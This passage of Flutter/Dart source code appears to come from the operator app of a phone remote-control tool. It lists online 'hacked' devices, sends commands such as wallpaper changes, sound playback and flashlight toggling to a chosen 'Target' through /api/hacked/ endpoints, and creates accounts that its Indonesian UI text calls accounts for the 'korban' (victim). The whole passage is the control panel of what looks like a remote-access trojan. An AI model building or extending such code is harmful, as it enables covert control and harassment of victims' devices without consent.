              boxShadow: isSelected
                ? [BoxShadow(color: _purple.withOpacity(0.25), blurRadius: 12)]
                : []),
            child: Row(children: [
              Container(width: 40, height: 40,
                decoration: BoxDecoration(
                  color: isSelected ? _purple.withOpacity(0.3) : _purple.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: _purple.withOpacity(0.4))),
                child: Center(child: SvgPicture.string(AppSvgIcons.mobile, width: 20, height: 20,
                  colorFilter: ColorFilter.mode(
                    isSelected ? _purple : _purple.withOpacity(0.5), BlendMode.srcIn)))),
              SizedBox(width: 12),
              Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text(d['deviceName'] as String? ?? 'Unknown',
                  style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                      color: Colors.white, fontWeight: FontWeight.bold)),
                SizedBox(height: 3),
                Row(children: [
                  Container(width: 6, height: 6,
                    decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.green,
                      boxShadow: [BoxShadow(color: Colors.green, blurRadius: 4)])),
                  SizedBox(width: 6),
                  const Text('Online', style: TextStyle(fontFamily: 'ShareTechMono',
                      fontSize: 9, color: Colors.green, letterSpacing: 1)),
                ]),
              ])),
              if (isSelected)
                const Icon(Icons.check_circle_rounded, color: _purple, size: 20),
            ]),
          ),
        );
      }).toList(),
    );
  }

  Widget _buildCommandGrid() {
    final cmds = _hackedCommands;
    return GridView.builder(
      physics: const NeverScrollableScrollPhysics(),
      shrinkWrap: true,
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2, childAspectRatio: 1.05,
        crossAxisSpacing: 14, mainAxisSpacing: 14),
      itemCount: cmds.length,
      itemBuilder: (ctx, i) => _buildCommandCard(cmds[i]),
    );
  }

  Widget _buildCommandCard(Map<String, dynamic> cmd) {
    final color    = cmd['color']  as Color;
    final isActive = cmd['active'] as bool;
    final type     = cmd['cmd']    as String;
    final isFlash  = type == 'flashlight';

    return GestureDetector(
      onTap: _sendingCmd ? null : () => _handleCommandTap(cmd),
      child: Container(
        decoration: BoxDecoration(
          gradient: AppTheme.cardGradient,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: isActive ? color.withOpacity(0.5) : color.withOpacity(0.2)),
          boxShadow: [BoxShadow(
            color: isActive ? color.withOpacity(0.15) : Colors.transparent,
            blurRadius: 10)]),
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Container(width: 40, height: 40,
              decoration: BoxDecoration(
                color: isActive ? color.withOpacity(0.2) : color.withOpacity(0.08),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: isActive ? color.withOpacity(0.5) : color.withOpacity(0.2))),
              child: Center(child: SvgPicture.string(cmd['icon'] as String, width: 20, height: 20,
                colorFilter: ColorFilter.mode(
                  isActive ? color : color.withOpacity(0.3), BlendMode.srcIn)))),
            if (!isActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(
                  color: Colors.orange.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(4),
                  border: Border.all(color: Colors.orange.withOpacity(0.4))),
                child: const Text('Soon', style: TextStyle(fontFamily: 'ShareTechMono',
                    fontSize: 8, color: Colors.orange, letterSpacing: 1)))
            else if (isFlash)
              Container(
                width: 40, height: 22,
                decoration: BoxDecoration(
                  color: _flashOn ? color.withOpacity(0.25) : Colors.grey.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(11),
                  border: Border.all(
                    color: _flashOn ? color : Colors.grey.withOpacity(0.3))),
                child: Center(child: Text(_flashOn ? 'On' : 'Off',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
                    fontWeight: FontWeight.bold,
                    color: _flashOn ? color : Colors.grey))))
            else
              const SizedBox.shrink(),
          ]),
          const Spacer(),
          Text(cmd['title'] as String,
            style: TextStyle(fontFamily: 'Orbitron', fontSize: 11,
              fontWeight: FontWeight.bold,
              color: isActive ? Colors.white : Colors.white.withOpacity(0.35),
              letterSpacing: 0.5)),
        ]),
      ),
    );
  }
  // ─── TAB 3: PSKNMRC ───────────────────────────────────────────────────────
  Widget _buildPsknmrcTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        const Text('USERNAME', style: TextStyle(
          fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF8B5CF6), letterSpacing: 1.5)),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(
            color: const Color(0xFF071525),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _purple.withOpacity(0.3))),
          child: TextField(
            controller: _psknmrcUsernameCtrl,
            style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 14),
            decoration: InputDecoration(
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              hintText: 'Masukkan username untuk korban...',
              hintStyle: TextStyle(color: AppTheme.textMuted.withOpacity(0.4),
                fontSize: 11, fontFamily: 'ShareTechMono')),
          ),
        ),
        const SizedBox(height: 8),
        Text('',
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
            color: AppTheme.textMuted.withOpacity(0.5))),
        const SizedBox(height: 16),

        // Feedback message
        if (_psknmrcMsg.isNotEmpty)
          Container(
            margin: const EdgeInsets.only(bottom: 14),
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
            decoration: BoxDecoration(
              color: _psknmrcMsg.startsWith('✓')
                ? Colors.green.withOpacity(0.1)
                : Colors.red.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(
                color: _psknmrcMsg.startsWith('✓')
                  ? Colors.green.withOpacity(0.3)
                  : Colors.red.withOpacity(0.3))),
            child: Text(_psknmrcMsg, style: TextStyle(
              fontFamily: 'ShareTechMono', fontSize: 11,
              color: _psknmrcMsg.startsWith('✓') ? Colors.green : Colors.red)),
          ),

        // Create button
        SizedBox(
          width: double.infinity,
          child: GestureDetector(
            onTap: _creatingPsknmrc ? null : _createPsknmrcUser,
            child: Container(
              padding: const EdgeInsets.symmetric(vertical: 16),
              decoration: BoxDecoration(
                gradient: _creatingPsknmrc
                  ? LinearGradient(colors: [_purple.withOpacity(0.4), const Color(0xFF6D28D9).withOpacity(0.4)])
                  : const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
                borderRadius: BorderRadius.circular(14)),
              child: Center(
                child: _creatingPsknmrc
                  ? const SizedBox(width: 18, height: 18,
                      child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                  : const Text('BUAT USERNAME', style: TextStyle(
                      fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold,
                      color: Colors.white, letterSpacing: 1.5)),
              ),
            ),
          ),
        ),
        const SizedBox(height: 60),
      ]),
    );
  }

  Future<void> _createPsknmrcUser() async {
    final username = _psknmrcUsernameCtrl.text.trim();
    if (username.isEmpty) {
      setState(() => _psknmrcMsg = 'Username tidak boleh kosong');
      return;
    }
    setState(() { _creatingPsknmrc = true; _psknmrcMsg = ''; });
    try {
      final res = await ApiService.post('/api/create/psknmrc', {
        'username': username,
        'password': 'psknmrc_${username}_auto',
      });
      if (res['success'] == true) {
        setState(() {
          _psknmrcMsg = '✓ Akun korban "$username" berhasil dibuat!';
          _psknmrcUsernameCtrl.clear();
        });
      } else {
        setState(() => _psknmrcMsg = res['message'] as String? ?? 'Gagal membuat akun');
      }
    } catch (e) {
      setState(() => _psknmrcMsg = 'Error: $e');
    }
    if (mounted) setState(() => _creatingPsknmrc = false);
  }
}


// ─── Wallpaper Upload Sheet ───────────────────────────────────────────────────
class _WallpaperSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String) onSent;
  final void Function(String) onError;
  const _WallpaperSheet({
    required this.deviceId,
    required this.deviceName,
    required this.onSent,
    required this.onError,
  });

  @override
  State<_WallpaperSheet> createState() => _WallpaperSheetState();
}

class _WallpaperSheetState extends State<_WallpaperSheet> {
  static const _purple = Color(0xFF8B5CF6);
  File? _pickedFile;
  String? _base64Image;
  String? _mimeType;
  bool _sending = false;

  Future<void> _pickImage(ImageSource source) async {
    final picker = ImagePicker();
    // maxWidth 1080 + quality 75 → ukuran wajar untuk base64 payload
    final xfile  = await picker.pickImage(
      source: source,
      imageQuality: 75,
      maxWidth: 1080,
      maxHeight: 1920,
    );
    if (xfile == null) return;
    final file   = File(xfile.path);
    final bytes  = await file.readAsBytes();
    final ext    = xfile.path.split('.').last.toLowerCase();
    final mime   = ext == 'png' ? 'image/png' : 'image/jpeg';
    setState(() {
      _pickedFile  = file;
      _base64Image = base64Encode(bytes);
      _mimeType    = mime;
    });
  }

  Future<void> _send() async {
    if (_base64Image == null) return;
    setState(() => _sending = true);
    try {
      final res = await ApiService.post('/api/hacked/wallpaper', {
        'deviceId':    widget.deviceId,
        'imageBase64': _base64Image,
        'mimeType':    _mimeType ?? 'image/jpeg',
      });
      Navigator.pop(context);
      if (res['success'] == true) {
        widget.onSent(res['message'] ?? 'Wallpaper dikirim!');
      } else {
        widget.onError(res['message'] ?? 'Gagal');
      }
    } catch (e) {
      widget.onError('Error: $e');
    }
    if (mounted) setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _purple.withOpacity(0.3)),
        ),
        padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(child: Container(width: 40, height: 4,
              decoration: BoxDecoration(
                color: _purple.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2)))),
            const SizedBox(height: 20),

            // Title
            Row(children: [
              Container(width: 36, height: 36,
                decoration: BoxDecoration(
                  color: const Color(0xFFFF6B35).withOpacity(0.15),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: const Color(0xFFFF6B35).withOpacity(0.4))),
                child: const Center(child: Icon(Icons.wallpaper_rounded,
                    color: Color(0xFFFF6B35), size: 18))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('GANTI WALLPAPER', style: TextStyle(
                  fontFamily: 'Orbitron', fontSize: 13,
                  fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${widget.deviceName}', style: const TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFFFF6B35))),
              ]),
            ]),
            const SizedBox(height: 20),

          // Preview
          if (_pickedFile != null)
            Container(
              height: 160,
              width: double.infinity,
              margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _purple.withOpacity(0.4))),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(13),
                child: Image.file(
                  _pickedFile!,
                  fit: BoxFit.cover,
                  width: double.infinity,
                ),
              ),
            )
          else
            Container(
              height: 120,
              width: double.infinity,
              margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(
                color: const Color(0xFF071525),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _purple.withOpacity(0.2))),
              child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(Icons.image_outlined, color: _purple.withOpacity(0.4), size: 36),
                const SizedBox(height: 8),
                Text('Pilih foto untuk dijadikan wallpaper',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                    color: Colors.white.withOpacity(0.4))),
              ]),
            ),

          // Pilih foto buttons
          Row(children: [
            Expanded(
              child: GestureDetector(
                onTap: () => _pickImage(ImageSource.gallery),
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 13),
                  decoration: BoxDecoration(
                    color: _purple.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _purple.withOpacity(0.4))),
                  child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                    Icon(Icons.photo_library_rounded, color: _purple, size: 16),
                    SizedBox(width: 8),
                    Text('Galeri', style: TextStyle(fontFamily: 'Orbitron',
                        fontSize: 11, color: _purple, letterSpacing: 1)),
                  ]),
                ),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: GestureDetector(
                onTap: () => _pickImage(ImageSource.camera),
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 13),
                  decoration: BoxDecoration(
                    color: _purple.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _purple.withOpacity(0.4))),
                  child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                    Icon(Icons.camera_alt_rounded, color: _purple, size: 16),
                    SizedBox(width: 8),
                    Text('Kamera', style: TextStyle(fontFamily: 'Orbitron',
                        fontSize: 11, color: _purple, letterSpacing: 1)),
                  ]),
                ),
              ),
            ),
          ]),
          const SizedBox(height: 16),

          // Send button
          Row(children: [
            Expanded(
              child: GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.white.withOpacity(0.15))),
                  child: const Center(child: Text('Batal', style: TextStyle(
                    fontFamily: 'Orbitron', fontSize: 12,
                    color: Colors.white70, letterSpacing: 1))),
                ),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: GestureDetector(
                onTap: (_pickedFile == null || _sending) ? null : _send,
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: _pickedFile != null
                      ? [const Color(0xFFFF6B35), const Color(0xFFEA580C)]
                      : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
                    borderRadius: BorderRadius.circular(12)),
                  child: Center(child: _sending
                    ? const SizedBox(width: 18, height: 18,
                        child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                    : const Text('KIRIM', style: TextStyle(fontFamily: 'Orbitron',
                        fontSize: 12, fontWeight: FontWeight.bold,
                        color: Colors.white, letterSpacing: 1))),
                ),
              ),
            ),
          ]),
        ],
      ),
      ), // end Container
    ); // end Padding
  }
}
// ─── Sound Upload Sheet ───────────────────────────────────────────────────────
class _SoundSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String) onSent;
  final void Function(String) onError;
  const _SoundSheet({
    required this.deviceId,
    required this.deviceName,
    required this.onSent,
    required this.onError,
  });

  @override
  State<_SoundSheet> createState() => _SoundSheetState();
}

class _SoundSheetState extends State<_SoundSheet> {
  static const _green = Color(0xFF10B981);
  String? _base64Audio;
  String? _mimeType;
  String? _fileName;
  bool _sending  = false;
  bool _picking  = false;

  Future<void> _pickAudio() async {
    // Minta permission storage dulu
    final status = await Permission.storage.request();
    if (!status.isGranted) {
      // Android 13+ pakai READ_MEDIA_AUDIO
      final audioStatus = await Permission.audio.request();
      if (!audioStatus.isGranted && mounted) {
        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
          content: Text('Izin storage/audio diperlukan',
            style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11)),
          backgroundColor: Colors.red,
          behavior: SnackBarBehavior.floating,
        ));
        return;
      }
    }

    setState(() => _picking = true);
    try {
      final result = await FilePicker.platform.pickFiles(
        type: FileType.custom,
        allowedExtensions: ['mp3', 'wav', 'ogg', 'm4a', 'aac'],
        allowMultiple: false,
      );
      if (result != null && result.files.single.path != null) {
        final file  = File(result.files.single.path!);
        final bytes = await file.readAsBytes();
        final ext   = result.files.single.extension?.toLowerCase() ?? 'mp3';
        final mime  = ext == 'wav'  ? 'audio/wav'
                    : ext == 'ogg'  ? 'audio/ogg'
                    : ext == 'aac'  ? 'audio/aac'
                    : ext == 'm4a'  ? 'audio/mp4'
                    : 'audio/mpeg';
        setState(() {
          _base64Audio = base64Encode(bytes);
          _mimeType    = mime;
          _fileName    = result.files.single.name;
        });
      }
    } catch (e) {
      if (mounted) widget.onError('Gagal buka file: $e');
    }
    if (mounted) setState(() => _picking = false);
  }

  Future<void> _send() async {
    if (_base64Audio == null) return;
    setState(() => _sending = true);
    try {
      final res = await ApiService.post('/api/hacked/command', {
        'deviceId': widget.deviceId,
        'type': 'sound',
        'payload': {
          'audioBase64': _base64Audio,
          'mimeType':    _mimeType ?? 'audio/mpeg',
        },
      });
      Navigator.pop(context);
      if (res['success'] == true) {
        widget.onSent(res['message'] ?? 'Sound dikirim!');
      } else {
        widget.onError(res['message'] ?? 'Gagal');
      }
    } catch (e) {
      widget.onError('Error: $e');
    }
    if (mounted) setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _green.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(child: Container(width: 40, height: 4,
              decoration: BoxDecoration(color: _green.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
            const SizedBox(height: 20),

            // Title
            Row(children: [
              Container(width: 36, height: 36,
                decoration: BoxDecoration(color: _green.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.4))),
                child: const Center(child: Icon(Icons.music_note_rounded, color: _green, size: 18))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('PLAY SOUND', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _green)),
              ]),
            ]),
            const SizedBox(height: 20),

            // File picked indicator / pick button
            GestureDetector(
              onTap: _picking ? null : _pickAudio,
              child: Container(
                width: double.infinity,
                padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 14),
                decoration: BoxDecoration(
                  color: _fileName != null ? _green.withOpacity(0.1) : const Color(0xFF071525),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: _fileName != null ? _green.withOpacity(0.5) : _green.withOpacity(0.25),
                    width: _fileName != null ? 1.5 : 1)),
                child: _picking
                  ? Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      SizedBox(width: 16, height: 16, child: CircularProgressIndicator(color: _green, strokeWidth: 2)),
                      const SizedBox(width: 10),
                      const Text('Membuka file manager...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)),
                    ])
                  : _fileName != null
                    ? Row(children: [
                        const Icon(Icons.audio_file_rounded, color: _green, size: 20),
                        const SizedBox(width: 10),
                        Expanded(child: Text(_fileName!, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white), overflow: TextOverflow.ellipsis)),
                        const Icon(Icons.check_circle_rounded, color: _green, size: 18),
                      ])
                    : Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                        Icon(Icons.folder_open_rounded, color: _green.withOpacity(0.7), size: 22),
                        const SizedBox(width: 10),
                        Text('Pilih File Audio (mp3/wav/ogg)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white.withOpacity(0.5))),
                      ]),
              ),
            ),
            const SizedBox(height: 20),

            // Buttons
            Row(children: [
              Expanded(child: GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                  child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))),
              )),
              const SizedBox(width: 12),
              Expanded(child: GestureDetector(
                onTap: (_base64Audio == null || _sending) ? null : _send,
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: _base64Audio != null
                      ? [_green, const Color(0xFF059669)]
                      : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
                    borderRadius: BorderRadius.circular(12)),
                  child: Center(child: _sending
                    ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                    : const Text('PLAY!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1))),
                ),
              )),
            ]),
          ],
        ),
      ),
    );
  }
}
